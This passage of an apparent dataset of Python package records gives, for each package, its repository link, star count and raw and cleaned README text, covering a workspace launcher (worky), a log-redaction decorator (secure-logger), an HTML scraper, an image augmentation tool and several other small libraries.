If you are on an arch-based distro and can access to the [Arch Linux Repository (AUR)](https://aur.archlinux.org/) you can install [worky](https://aur.archlinux.org/packages/worky) using an AUR helper like [yay](https://github.com/Jguer/yay):
```shell
yay -S worky
```

## Configuration
If you prefer a practical way to understand how to worky configuration works, you can take a look at the [examples directory](https://github.com/ZappaBoy/worky/tree/main/examples).

### Worky configuration file
There are multiple ways to configure worky:
 1. Worky automatically looks for a `.worky.toml` file in the current directory where is called.
 2. You can create a `~/.config/worky/{{project_name}}.toml` file and worky will automatically look for it when you run `worky project_name`.
    For example, if you have a project named `my_project` you can create a `~/.config/worky/my_project/config.toml` file and use `worky my_project` to load the project workspace.
 3. You can create a subdirectory named as your project (`project_name`) under the `~/.config/worky/`. Here you can put your `config.toml` file and worky will look for it when you run `worky project_name`.
    For example, if you have a project named `my_project` you can create a `~/.config/worky/my_project/config.toml` file and use `worky my_project` to load the project workspace.
 4. You can specify a configuration file using the `-c` flag followed by the path of the config file (see `worky --help` for more details).

### Variables
Variables can be defined in the `[variables]` section of the configuration file. The variable's value is the command to be executed.
The variables can be used in all the config file except for the steps name.
The value of the variables used in the step name defines the command that will be executed. See the [steps section](#steps) for more details.

### Steps
The steps are the commands that will be executed when you load the workspace. The command is defined by the step name using a variable.
For example, if you have a variable named `backend` with the value `idea` you can define a step named `backend` and worky will run the idea IDE.

#### Args
Steps can have an `args` property that is a list of arguments to be passed to the command when it is executed.
An example of an argument can be the path of the project to open but this strictly depends on the program that you want to load.

#### Condition
Steps can have a `condition` property that is the name of a flag that you can pass when you run worky that defines if the step should be executed or not.
For example, if you want to run a `docker-compose` command only if you pass the `-f docker` flag you can define a step like this:
```toml
[variables]
compose = ""docker-compose""

[compose]
condition = ""docker""
args = [
    ""-f"",
    ""/path/to/docker-compose.yaml"",
    ""up""
]
```
Then you can run `worky -f docker` to load the workspace and run the `compose` step.

## Limitations
Worky configuration depends on the [TOML](https://toml.io/en/) syntax. This means that you can't create two steps with the same name.
You can crate two different steps using variables with the same value. Moreover, this helps to keep the configuration file clean and readable.

## Usage
After installing and configured worky, you can use it to load your project workspace simply by running:
```shell
worky  # If you have a .worky.toml file in the current directory
# or
worky {{project_name}}  # If you have a config file in ~/.config/worky/{{project_name}}/config.toml or ~/.config/worky/{{project_name}}.toml
# or
worky -c {{path_to_config_file}}  # Defining a custom config file
```

## For developers
Install dependencies:
```shell
pyenv local 3.10 # Or higher like 3.11.1
poetry use env 3.10
poetry install
poetry run worky {{your_command_args}}
```

After you have made your changes, if you have changed something in the `pyproject.toml` use `poetry2setup` dev dependency to update `setup.py`:
```shell
poetry2setup > setup.py
```

Then build the package with `poetry build` and create a PR with your changes if there are no issues.

# Buy me a coffee
If you appreciate my work I will appreciate if you [buy me a coffee](https://github.com/sponsors/ZappaBoy).
",zappaboy/worky
secure-logger,https://github.com/lpm0073/secure-logger,5,4379,4243,"# Secure Logger

[![Tests](https://github.com/lpm0073/secure-logger/actions/workflows/tests.yml/badge.svg)](https://github.com/lpm0073/secure-logger/actions)
[![Source code](https://img.shields.io/static/v1?logo=github&label=Git&style=flat-square&color=brightgreen&message=Source%20code)](https://github.com/lpm0073/secure-logger)
[![PyPI releases](https://img.shields.io/pypi/v/secure-logger?logo=python&logoColor=white)](https://pypi.org/project/secure-logger)
[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
[![hack.d Lawrence McDaniel](https://img.shields.io/badge/hack.d-Lawrence%20McDaniel-orange.svg)](https://lawrencemcdaniel.com)

A Python decorator to generate redacted and nicely formatted log entries. Works on all callables: class, class methods, Python module functions. Recursively redacts Python dictionary key values based on a customizable list of case-insensitive keys. Prevents your sensitive application data like cloud provider key-pairs from leaking into your application logs.

## Usage

### As a decorator

```python
from secure_logger.decorators import secure_logger

class Foo(object):

    @secure_logger()
    def bar(self, dict_data, list_data):
        pass

# call your method, passing some sensitive data
dict_data = {
    'not_a_sensitive_key': 'you-can-see-me',
    'aws-access-key_id': conf.AWS_ACCESS_KEY_ID,
    'aws-secret-access-key': conf.AWS_SECRET_ACCESS_KEY
}
list_data = ['foo', 'bar']
foo = Foo()
foo.bar(dict_data=dict_data, list_data=list_data)
```

Log output:

```log
INFO:secure_logger: __main__.Foo().bar()  keyword args: {
    ""dict_data"": {
        ""not_a_sensitive_key"": ""you-can-see-me"",
        ""aws-access-key-id"": ""*** -- secure_logger() -- ***"",
        ""aws-secret-access-key"": ""*** -- secure_logger() -- ***""
    },
    ""list_data"": [
        ""foo"",
        ""bar""
    ]
}
```

### As library functions

```python
from secure_logger.masked_dict import masked_dict, masked_dict2str

dict_data = {
    'not_a_sensitive_key': 'you-can-see-me',
    'aws-access-key_id': conf.AWS_ACCESS_KEY_ID,
    'aws-secret-access-key': conf.AWS_SECRET_ACCESS_KEY
}
print(masked_dict2str(dict_data))
```

Output:

```bash
{
    ""not_a_sensitive_key"": ""you-can-see-me"",
    ""aws-access-key-id"": ""*** -- secure_logger() -- ***"",
    ""aws-secret-access-key"": ""*** -- secure_logger() -- ***""
}
```

## Installation

```bash
pip install secure-logger
```

## Configuration

secure_logger accepts optional parameters.

- sensitive_keys: a Python list of dictionary keys. Not case sensitive.
- message: a string value that will replace the sensitive key values
- indent: number of characters to indent JSON string output when logging output

```python
class MyClass():

    @secure_logger(sensitive_keys=[""password"", ""token"", ""crown_jewels""], message=""***"", indent=4)
    def another_def(self):
```

## Configuration Defaults

```python
DEFAULT_REDACTION_MESSAGE = ""*** -- secure_logger() -- ***""
DEFAULT_INDENT = 4
DEFAULT_SENSITIVE_KEYS = [
    ""password"",
    ""token"",
    ""client_id"",
    ""client_secret"",
    ""Authorization"",
    ""secret"",
    ""access_key_id"",
    ""secret_access_key"",
    ""access-key-id"",
    ""secret-access-key"",
    ""aws_access_key_id"",
    ""aws_secret_access_key"",
    ""aws-access-key-id"",
    ""aws-secret-access-key"",
]
```


### Contributing

Pull requests are welcome, and you can also contact [Lawrence McDaniel](https://lawrencemcdaniel.com/contact) directly.

### Getting Started With Local development

- Use the same virtual environment that you use for edx-platform
- Ensure that your Python interpreter to 3.8x
- install black: <https://pypi.org/project/black/>
- install flake8: <https://flake8.pycqa.org/en/latest/>
- install flake8-coding: <https://pypi.org/project/flake8-coding/>

```bash
# Run these from within your edx-platform virtual environment
python3 -m venv venv
source venv/bin/activate

pip install -r requirements/local.txt
pip install pre-commit black flake8
pre-commit install
```

#### Local development good practices

- run `black` on modified code before committing.
- run `flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics`
- run `flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics`
- run `pre-commit run --all-files` before pushing. see: <https://pre-commit.com/>
","# Secure Logger

[![Tests](https://github.com/lpm0073/secure-logger/actions/workflows/tests.yml/badge.svg)](https://github.com/lpm0073/secure-logger/actions)
[![Source code](https://img.shields.io/static/v1?logo=github&label=Git&style=flat-square&color=brightgreen&message=Source%20code)](https://github.com/lpm0073/secure-logger)
[![PyPI releases](https://img.shields.io/pypi/v/secure-logger?logo=python&logoColor=white)](https://pypi.org/project/secure-logger)
[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
[![hack.d Lawrence McDaniel](https://img.shields.io/badge/hack.d-Lawrence%20McDaniel-orange.svg)](https://lawrencemcdaniel.com)

A Python decorator to generate redacted and nicely formatted log entries. Works on all callables: class, class methods, Python module functions. Recursively redacts Python dictionary key values based on a customizable list of case-insensitive keys. Prevents your sensitive application data like cloud provider key-pairs from leaking into your application logs.

## Usage

### As a decorator

```python
from secure_logger.decorators import secure_logger

class Foo(object):

    @secure_logger()
    def bar(self, dict_data, list_data):
        pass

# call your method, passing some sensitive data
dict_data = {
    'not_a_sensitive_key': 'you-can-see-me',
    'aws-access-key_id': conf.AWS_ACCESS_KEY_ID,
    'aws-secret-access-key': conf.AWS_SECRET_ACCESS_KEY
}
list_data = ['foo', 'bar']
foo = Foo()
foo.bar(dict_data=dict_data, list_data=list_data)
```

Log output:

```log
INFO:secure_logger: __main__.Foo().bar()  keyword args: {
    ""dict_data"": {
        ""not_a_sensitive_key"": ""you-can-see-me"",
        ""aws-access-key-id"": ""*** -- secure_logger() -- ***"",
        ""aws-secret-access-key"": ""*** -- secure_logger() -- ***""
    },
    ""list_data"": [
        ""foo"",
        ""bar""
    ]
}
```

### As library functions

```python
from secure_logger.masked_dict import masked_dict, masked_dict2str

dict_data = {
    'not_a_sensitive_key': 'you-can-see-me',
    'aws-access-key_id': conf.AWS_ACCESS_KEY_ID,
    'aws-secret-access-key': conf.AWS_SECRET_ACCESS_KEY
}
print(masked_dict2str(dict_data))
```

Output:

```bash
{
    ""not_a_sensitive_key"": ""you-can-see-me"",
    ""aws-access-key-id"": ""*** -- secure_logger() -- ***"",
    ""aws-secret-access-key"": ""*** -- secure_logger() -- ***""
}
```

## Installation

```bash
pip install secure-logger
```

## Configuration

secure_logger accepts optional parameters.

- sensitive_keys: a Python list of dictionary keys. Not case sensitive.
- message: a string value that will replace the sensitive key values
- indent: number of characters to indent JSON string output when logging output

```python
class MyClass():

    @secure_logger(sensitive_keys=[""password"", ""token"", ""crown_jewels""], message=""***"", indent=4)
    def another_def(self):
```

## Configuration Defaults

```python
DEFAULT_REDACTION_MESSAGE = ""*** -- secure_logger() -- ***""
DEFAULT_INDENT = 4
DEFAULT_SENSITIVE_KEYS = [
    ""password"",
    ""token"",
    ""client_id"",
    ""client_secret"",
    ""Authorization"",
    ""secret"",
    ""access_key_id"",
    ""secret_access_key"",
    ""access-key-id"",
    ""secret-access-key"",
    ""aws_access_key_id"",
    ""aws_secret_access_key"",
    ""aws-access-key-id"",
    ""aws-secret-access-key"",
]
```


### Contributing

Pull requests are welcome, and you can also contact [Lawrence McDaniel](https://lawrencemcdaniel.com/contact) directly.

### Getting Started With Local development

- Use the same virtual environment that you use for edx-platform
- Ensure that your Python interpreter to 3.8x
- install black: 
- install flake8: 
- install flake8-coding: 

```bash
# Run these from within your edx-platform virtual environment
python3 -m venv venv
source venv/bin/activate

pip install -r requirements/local.txt
pip install pre-commit black flake8
pre-commit install
```

#### Local development good practices

- run `black` on modified code before committing.
- run `flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics`
- run `flake8 . --count --exit-zero --max-complexity=10 --max-line-length=127 --statistics`
- run `pre-commit run --all-files` before pushing. see: 
",lpm0073/secure-logger
mountaintop,https://github.com/yinanxu0/mountaintop,11,0,0,,,yinanxu0/mountaintop
htmlpageparser,https://github.com/snjyor/HtmlPageParser,0,5610,4816,"# HtmlPageParser
通用HTML页面内容解析器

## 安装
```shell
pip install HtmlPageParser
```

## 使用示例
```python
# 爬取页面内容
from HtmlPageParser.src.parser import Parser
with open(""test.html"", ""r"", encoding=""utf-8"") as f:
    html = f.read()
client = Parser(base_url=""https://www.163.com/"")
xpath_css = [
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""}
]
data = client.parser(html, css_selector=""#content > div.post_body"", xpath_css=xpath_css)
print(data)

# json结构数据转为markdown格式
import json
from HtmlPageParser.src.json2markdown import Json2Markdown
with open(""json_data.json"", 'r', encoding='utf-8') as f:
    json_data = json.load(f)
J2M = Json2Markdown()
markdown_data = J2M.json2markdown(json_data)
print(markdown_data)

```


| 参数           |参数说明|
|:-------------|:---|
| base_url     |爬取页面的域名，如爬取的页面是https://www.163.com/dy/article/I35SM5AN0514EGPO.html，那base_url就是https://www.163.com/|
| html         |该页面的html元素，即requests.get()返回的response.text|
| css_selector |需要爬取的元素的上一级标签的css_selector,右键检查选中复制selector即可|
| xpath_css    |xpath和css的映射字典，如果需要爬取的页面内部还有需要继续深入爬取的标签，则需要配置需要深入爬取标签上一级的xpath和css的映射字典，具体示例如下|
| a_attr       |需要抓取a标签中的属性，默认为herf|
| img_attr     |需要抓取img标签中的属性，默认为src|
| video_attr   |需要抓取video标签中的属性，默认为src|


## 配置示例
如下述元素块，
例如我想要抓取div[class='post_body']下面的所有标签，那css_selector就是```<div class=""post_body"">```这个标签位置的css_selector; 如果只配置了上面的css_selector，那只能抓到```<div class=""post_body"">```标签下一层的标签内容，不能抓到该标签下一层标签里面的标签内容， 这个时候需要配置xpath_css参数，即如下所示，如果我想继续深入抓取```<p class=""f_center"">```标签下面的img标签，那我需要写```<p class=""f_center"">```这层标签的xpath和css字典，下述元素中有两个```<p class=""f_center"">```标签，所以需要按顺序写两个映射字典，格式如下：
```python
xpath_css = [
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""}
]
```

```html
    <div class=""post_top"">
        <div class=""post_body"">
            <p id=""1O5D2DRS"">
                <video src=""http://flv0.bn.netease.com/6ac0c4.mp4"" data-video=""http://flv0.bn.netease.com/6ac0c40c71faab9.jpg"">
                当地时间4月24日，联合国秘书长古特雷斯与俄外交部长拉夫罗夫举行了会面，双方就乌克兰局势、阿富汗、叙利亚等方面的问题进行了讨论。
            </p>
            <p class=""f_center"">
                <img src=""https://nimg.ws.126.net/?url=http%3A%2F%2Fdingyue.00ne00esc.jpg"">
                <br>
            </p>
            <p id=""1O5G5ICJ"">视频截图</p>
            <p id=""1O556NEP"">古特雷斯还向拉夫罗夫提交了一封致俄总统普京的信，概述了旨在改进、延长和扩大黑海粮食协议的方向。
            </p>
            <p id=""1O556NEQ"">报道称古特雷斯已向该协议的另外两个签署方乌克兰、土耳其，发送了类似函件。
            </p>
            <p id=""1O556NER"">此外，古特雷斯还向拉夫罗夫介绍了秘书处在解决俄罗斯官员签证问题上所做的最新努力。</p>
            <p class=""f_center"">
                <img src=""https://nimg.ws.126.net/?url=http%3A%2F%2Fdingyue.000hp00ajc.jpg"">
                <br>
            </p>
        </div>
    </div>
```


# 解析结果格式
下述结果不是由上面的html元素解析而来，只是例举出多种标签的结构
```json
[
    {
        ""type"": ""p"",
        ""context"": ""Imprimir"",
        ""link"": [
            {
                ""start"": 0,
                ""end"": 8,
                ""origin_url"": ""https://www.minsalud.gob.bo/1089-sorata-cumple-con-la-implementacion-de-la-politica-sanitaria-safci-encaminada-por-el-ministerio-de-salud?tmpl=component&print=1&layout=default"",
                ""url"": ""https://www.minsalud.gob.bo/1089-sorata-cumple-con-la-implementacion-de-la-politica-sanitaria-safci-encaminada-por-el-ministerio-de-salud?tmpl=component&print=1&layout=default""
            }
        ]
    },
    {
        ""type"": ""img"",
        ""context"": """",
        ""link"": [
            {
                ""origin_url"": ""https://www.minsalud.gob.bo/images/noticias16/sorata2.gif"",
                ""url"": ""Bolivia_Regulation/Files//8b36d2ab18f5fed475dffa42b7e0bbe7.""
            }
        ]
    },
    {
        ""type"": ""h1"",
        ""context"": ""La Paz – Viernes 6 de Mayo de 2016 | Unidad de Comunicación"",
        ""link"": []
    },
    {
        ""type"": ""h2"",
        ""context"": ""Otras peticiones fundamentales fueron la compra de ambulancias"",
        ""link"": []
    },
    {
        ""type"": ""table"",
        ""link"": [],
        ""context"": [
            {
                ""type"": ""tr"",
                ""link"": [],
                ""context"": [
                    {
                        ""type"": ""th"",
                        ""context"": ""配信動画"",
                        ""link"": []
                    },
                    {
                        ""type"": ""th"",
                        ""context"": ""配信日"",
                        ""link"": []
                    }
                ]
            },
            {
                ""type"": ""tr"",
                ""link"": [],
                ""context"": [
                    {
                        ""type"": ""td"",
                        ""context"": ""これでわかる!適合性調査における再審査等申請から日程調整までの手続き -資料作成のポイント-"",
                        ""link"": []
                    },
                    {
                        ""type"": ""td"",
                        ""context"": ""2022年11月15日"",
                        ""link"": []
                    }
                ]
            },
            {
                ""type"": ""tr"",
                ""link"": [],
                ""context"": [
                    {
                        ""type"": ""td"",
                        ""context"": ""再審査適合性調査等における解析用データセットの活用について"",
                        ""link"": []
                    },
                    {
                        ""type"": ""td"",
                        ""context"": ""2022年11月15日"",
                        ""link"": []
                    }
                ]
            }
        ]
    },
```
","# HtmlPageParser
通用HTML页面内容解析器

## 安装
```shell
pip install HtmlPageParser
```

## 使用示例
```python
# 爬取页面内容
from HtmlPageParser.src.parser import Parser
with open(""test.html"", ""r"", encoding=""utf-8"") as f:
    html = f.read()
client = Parser(base_url=""https://www.163.com/"")
xpath_css = [
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""}
]
data = client.parser(html, css_selector=""#content > div.post_body"", xpath_css=xpath_css)
print(data)

# json结构数据转为markdown格式
import json
from HtmlPageParser.src.json2markdown import Json2Markdown
with open(""json_data.json"", 'r', encoding='utf-8') as f:
    json_data = json.load(f)
J2M = Json2Markdown()
markdown_data = J2M.json2markdown(json_data)
print(markdown_data)

```


| 参数           |参数说明|
|:-------------|:---|
| base_url     |爬取页面的域名，如爬取的页面是https://www.163.com/dy/article/I35SM5AN0514EGPO.html，那base_url就是https://www.163.com/|
| html         |该页面的html元素，即requests.get()返回的response.text|
| css_selector |需要爬取的元素的上一级标签的css_selector,右键检查选中复制selector即可|
| xpath_css    |xpath和css的映射字典，如果需要爬取的页面内部还有需要继续深入爬取的标签，则需要配置需要深入爬取标签上一级的xpath和css的映射字典，具体示例如下|
| a_attr       |需要抓取a标签中的属性，默认为herf|
| img_attr     |需要抓取img标签中的属性，默认为src|
| video_attr   |需要抓取video标签中的属性，默认为src|


## 配置示例
如下述元素块，
例如我想要抓取div[class='post_body']下面的所有标签，那css_selector就是``````这个标签位置的css_selector; 如果只配置了上面的css_selector，那只能抓到``````标签下一层的标签内容，不能抓到该标签下一层标签里面的标签内容， 这个时候需要配置xpath_css参数，即如下所示，如果我想继续深入抓取``````标签下面的img标签，那我需要写``````这层标签的xpath和css字典，下述元素中有两个``````标签，所以需要按顺序写两个映射字典，格式如下：
```python
xpath_css = [
    {"".//p[@class='f_center']"": "".f_center""},
    {"".//p[@class='f_center']"": "".f_center""}
]
```

```html
    



                当地时间4月24日，联合国秘书长古特雷斯与俄外交部长拉夫罗夫举行了会面，双方就乌克兰局势、阿富汗、叙利亚等方面的问题进行了讨论。
            




视频截图
古特雷斯还向拉夫罗夫提交了一封致俄总统普京的信，概述了旨在改进、延长和扩大黑海粮食协议的方向。
            
报道称古特雷斯已向该协议的另外两个签署方乌克兰、土耳其，发送了类似函件。
            
此外，古特雷斯还向拉夫罗夫介绍了秘书处在解决俄罗斯官员签证问题上所做的最新努力。






```


# 解析结果格式
下述结果不是由上面的html元素解析而来，只是例举出多种标签的结构
```json
[
    {
        ""type"": ""p"",
        ""context"": ""Imprimir"",
        ""link"": [
            {
                ""start"": 0,
                ""end"": 8,
                ""origin_url"": ""https://www.minsalud.gob.bo/1089-sorata-cumple-con-la-implementacion-de-la-politica-sanitaria-safci-encaminada-por-el-ministerio-de-salud?tmpl=component&print=1&layout=default"",
                ""url"": ""https://www.minsalud.gob.bo/1089-sorata-cumple-con-la-implementacion-de-la-politica-sanitaria-safci-encaminada-por-el-ministerio-de-salud?tmpl=component&print=1&layout=default""
            }
        ]
    },
    {
        ""type"": ""img"",
        ""context"": """",
        ""link"": [
            {
                ""origin_url"": ""https://www.minsalud.gob.bo/images/noticias16/sorata2.gif"",
                ""url"": ""Bolivia_Regulation/Files//8b36d2ab18f5fed475dffa42b7e0bbe7.""
            }
        ]
    },
    {
        ""type"": ""h1"",
        ""context"": ""La Paz – Viernes 6 de Mayo de 2016 | Unidad de Comunicación"",
        ""link"": []
    },
    {
        ""type"": ""h2"",
        ""context"": ""Otras peticiones fundamentales fueron la compra de ambulancias"",
        ""link"": []
    },
    {
        ""type"": ""table"",
        ""link"": [],
        ""context"": [
            {
                ""type"": ""tr"",
                ""link"": [],
                ""context"": [
                    {
                        ""type"": ""th"",
                        ""context"": ""配信動画"",
                        ""link"": []
                    },
                    {
                        ""type"": ""th"",
                        ""context"": ""配信日"",
                        ""link"": []
                    }
                ]
            },
            {
                ""type"": ""tr"",
                ""link"": [],
                ""context"": [
                    {
                        ""type"": ""td"",
                        ""context"": ""これでわかる!適合性調査における再審査等申請から日程調整までの手続き -資料作成のポイント-"",
                        ""link"": []
                    },
                    {
                        ""type"": ""td"",
                        ""context"": ""2022年11月15日"",
                        ""link"": []
                    }
                ]
            },
            {
                ""type"": ""tr"",
                ""link"": [],
                ""context"": [
                    {
                        ""type"": ""td"",
                        ""context"": ""再審査適合性調査等における解析用データセットの活用について"",
                        ""link"": []
                    },
                    {
                        ""type"": ""td"",
                        ""context"": ""2022年11月15日"",
                        ""link"": []
                    }
                ]
            }
        ]
    },
```
",snjyor/htmlpageparser
cvaugmentor,https://github.com/AliKHaliliT/CVAugmentor,0,2583,2583,"# CVAugmentor
## Introduction
This is a simple tool to augment images and videos for computer vision tasks.

Available augmentations are:
    no_augmentation,
    flip,
    zoom,
    rotate,
    shear,
    grayscale,
    hue,
    saturation,
    brightness,
    exposure,
    blur,
    noise,
    cutout,
    negative,
## Installation
```bash
pip install CVAugmentor
```
## Usage
### Single Image Augmentation
```python
# Importing the libraries
from CVAugmentor import Augmentations as aug
from CVAugmentor import Pipeline


# Define the augmentations
augmentations = {
    ""zoom"": aug.zoom(),
    ""flip"": aug.flip(),
}

# Create a Pipeline object
p = Pipeline()

# Augment the image
p.augment(input_path=""path/to/input_image"", output_path=""path/to/output_image"", target=""image"", type=""single"", mode=""singular"", augmentations=augmentations, verbose=True, warn_verbose=True)
```
### Single Video Augmentation
```python
# Importing the libraries
from CVAugmentor import Augmentations as aug
from CVAugmentor import Pipeline


# Define the augmentations
augmentations = {
    ""zoom"": aug.zoom(),
    ""flip"": aug.flip(),
}

# Create a Pipeline object
p = Pipeline()

# Augment the video
p.augment(input_path=""path/to/input_video"", output_path=""path/to/output_video"", target=""video"", type=""single"", mode=""singular"", augmentations=augmentations, verbose=True, warn_verbose=True)
```
### Augmenting Multiple Images
```python
# Importing the libraries
from CVAugmentor import Augmentations as aug
from CVAugmentor import Pipeline


# Define the augmentations
augmentations = {
    ""zoom"": aug.zoom(),
    ""flip"": aug.flip(),
}

# Create a Pipeline object
p = Pipeline()

# Augment the images
p.augment(input_path=""path/to/input_images"", output_path=""path/to/output_images"", target=""image"", type=""batch"", mode=""singular"", augmentations=augmentations, verbose=True, warn_verbose=True)
```
### Augmenting Multiple Videos
```python
# Importing the libraries
from CVAugmentor import Augmentations as aug
from CVAugmentor import Pipeline


# Define the augmentations
augmentations = {
    ""zoom"": aug.zoom(),
    ""flip"": aug.flip(),
}

# Create a Pipeline object
p = Pipeline()

# Augment the videos
p.augment(input_path=""path/to/input_videos"", output_path=""path/to/output_videos"", target=""video"", type=""batch"", mode=""singular"", augmentations=augmentations, verbose=True, warn_verbose=True)
```
## License
This work is licensed under an [MIT](https://choosealicense.com/licenses/mit/) License.
","# CVAugmentor
## Introduction
This is a simple tool to augment images and videos for computer vision tasks.

Available augmentations are:
    no_augmentation,
    flip,
    zoom,
    rotate,
    shear,
    grayscale,
    hue,
    saturation,
    brightness,
    exposure,
    blur,
    noise,
    cutout,
    negative,
## Installation
```bash
pip install CVAugmentor
```
## Usage
### Single Image Augmentation
```python
# Importing the libraries
from CVAugmentor import Augmentations as aug
from CVAugmentor import Pipeline


# Define the augmentations
augmentations = {
    ""zoom"": aug.zoom(),
    ""flip"": aug.flip(),
}

# Create a Pipeline object
p = Pipeline()

# Augment the image
p.augment(input_path=""path/to/input_image"", output_path=""path/to/output_image"", target=""image"", type=""single"", mode=""singular"", augmentations=augmentations, verbose=True, warn_verbose=True)
```
### Single Video Augmentation
```python
# Importing the libraries
from CVAugmentor import Augmentations as aug
from CVAugmentor import Pipeline


# Define the augmentations
augmentations = {
    ""zoom"": aug.zoom(),
    ""flip"": aug.flip(),
}

# Create a Pipeline object
p = Pipeline()

# Augment the video
p.augment(input_path=""path/to/input_video"", output_path=""path/to/output_video"", target=""video"", type=""single"", mode=""singular"", augmentations=augmentations, verbose=True, warn_verbose=True)
```
### Augmenting Multiple Images
```python
# Importing the libraries
from CVAugmentor import Augmentations as aug
from CVAugmentor import Pipeline


# Define the augmentations
augmentations = {
    ""zoom"": aug.zoom(),
    ""flip"": aug.flip(),
}

# Create a Pipeline object
p = Pipeline()

# Augment the images
p.augment(input_path=""path/to/input_images"", output_path=""path/to/output_images"", target=""image"", type=""batch"", mode=""singular"", augmentations=augmentations, verbose=True, warn_verbose=True)
```
### Augmenting Multiple Videos
```python
# Importing the libraries
from CVAugmentor import Augmentations as aug
from CVAugmentor import Pipeline


# Define the augmentations
augmentations = {
    ""zoom"": aug.zoom(),
    ""flip"": aug.flip(),
}

# Create a Pipeline object
p = Pipeline()

# Augment the videos
p.augment(input_path=""path/to/input_videos"", output_path=""path/to/output_videos"", target=""video"", type=""batch"", mode=""singular"", augmentations=augmentations, verbose=True, warn_verbose=True)
```
## License
This work is licensed under an [MIT](https://choosealicense.com/licenses/mit/) License.
",alikhalilit/cvaugmentor
model-scraper,https://github.com/FINTLabs/fint-model-scraper,0,108,108,"An xml parser that gathers useful information about each model in a package from the information model xml.
","An xml parser that gathers useful information about each model in a package from the information model xml.
",fintlabs/fint-model-scraper
spacs,https://github.com/rlebel12/spacs,2,1457,1457,"# SPACS: Simple Pydantic AIOHTTP Client Sessions

A package to assist in managing and using long-lived AIOHTTP client sessions with simplicity. Built to handle Pydantic objects.

## Features

* Handles request params and bodies as either Pydantic objects or native Python dictionaries, converting items to JSON-safe format.
* Abstracts away internals of managing the request/response objects, instead either returning parsed response content on success, or raising a specialized error object.
* Automatically manages persistent connections to be shared over extended lifespan across application, cleaning up all open connections on teardown.
* Utilizes modern Python type hinting.

## Usage

```python
import spacs
from pydantic import BaseModel

...

example_client = spacs.SpacsClient(base_url=""http://example.com"")

# Basic request with error handling
try:
    apple_response = await example_client.get(""fruit/apple"", params={""cultivar"": ""honeycrisp""})
except spacs.SpacsRequestError as error:
    print({""code"": error.status_code, ""reason"": error.reason})

# Sending Pydantic objects via HTTP POST
class MyModel(BaseModel):
    name: str
    age: int

example_object = MyModel(name=""James"", age=25)
person_response = await example_client.post(""person"", body=example_object)

# Manually closing a session
await example_client.close()
# Alternatively, to close all open sessions:
await spacs.SpacsClient.close_all()
```

## Building

```
poetry build
```
","# SPACS: Simple Pydantic AIOHTTP Client Sessions

A package to assist in managing and using long-lived AIOHTTP client sessions with simplicity. Built to handle Pydantic objects.

## Features

* Handles request params and bodies as either Pydantic objects or native Python dictionaries, converting items to JSON-safe format.
* Abstracts away internals of managing the request/response objects, instead either returning parsed response content on success, or raising a specialized error object.
* Automatically manages persistent connections to be shared over extended lifespan across application, cleaning up all open connections on teardown.
* Utilizes modern Python type hinting.

## Usage

```python
import spacs
from pydantic import BaseModel

...

example_client = spacs.SpacsClient(base_url=""http://example.com"")

# Basic request with error handling
try:
    apple_response = await example_client.get(""fruit/apple"", params={""cultivar"": ""honeycrisp""})
except spacs.SpacsRequestError as error:
    print({""code"": error.status_code, ""reason"": error.reason})

# Sending Pydantic objects via HTTP POST
class MyModel(BaseModel):
    name: str
    age: int

example_object = MyModel(name=""James"", age=25)
person_response = await example_client.post(""person"", body=example_object)

# Manually closing a session
await example_client.close()
# Alternatively, to close all open sessions:
await spacs.SpacsClient.close_all()
```

## Building

```
poetry build
```
",rlebel12/spacs
deepfastvision,https://github.com/fabprezja/deep-fast-vision,8,0,0,,,fabprezja/deep-fast-vision
batche,https://github.com/gautierdag/batche,1,185,185,"

[![tests](https://github.com/gautierdag/batche/actions/workflows/test.yml/badge.svg)](https://github.com/gautierdag/batche/actions/workflows/test.yml)

# batche
Batch cache decorator
","

[![tests](https://github.com/gautierdag/batche/actions/workflows/test.yml/badge.svg)](https://github.com/gautierdag/batche/actions/workflows/test.yml)

# batche
Batch cache decorator
",gautierdag/batche
django-sphinx-hosting,https://github.com/caltechads/django-sphinx-hosting,15,1188,1188,"# django-sphinx-hosting

**Documentation**: [django-sphinx-hosting.readthedocs.org](https://django-sphinx-hosting.readthedocs.org)

This reusable Django application provides models, views, permissions, REST API
endpoints and management commands for making a private Sphinx documentation
hosting platform.

This is useful for when you want Sphinx documentation for your internal software
projects, but that is too sensitive to be shared with a third party.

## Features

* Users must be authenticated to view docs
* Multiple levels of privileges within the system based on Django authentication
* Manage multiple versions of your docs per project
* Automatically build and display navigation for each version of your documentaion
* Renders all documentation published within with a consistent theme
* Tag projects with classifiers to refine searching and filtering
* Search across all projects
* Use REST API to programmatically interact with the system.  Useful for
  integrating into a CI/CD system

## Installation and Configuration

See the [documentation](https://django-sphinx-hosting.readthedocs.org) for how
to install and configure `django-sphinx-hosting` in your Django project.
","# django-sphinx-hosting

**Documentation**: [django-sphinx-hosting.readthedocs.org](https://django-sphinx-hosting.readthedocs.org)

This reusable Django application provides models, views, permissions, REST API
endpoints and management commands for making a private Sphinx documentation
hosting platform.

This is useful for when you want Sphinx documentation for your internal software
projects, but that is too sensitive to be shared with a third party.

## Features

* Users must be authenticated to view docs
* Multiple levels of privileges within the system based on Django authentication
* Manage multiple versions of your docs per project
* Automatically build and display navigation for each version of your documentaion
* Renders all documentation published within with a consistent theme
* Tag projects with classifiers to refine searching and filtering
* Search across all projects
* Use REST API to programmatically interact with the system.  Useful for
  integrating into a CI/CD system

## Installation and Configuration

See the [documentation](https://django-sphinx-hosting.readthedocs.org) for how
to install and configure `django-sphinx-hosting` in your Django project.
",caltechads/django-sphinx-hosting
gearwheels,https://github.com/vladpy8/gearwheels,0,61,61,"# Gearwheels

This is a project placeholder, please stand by
","# Gearwheels

This is a project placeholder, please stand by
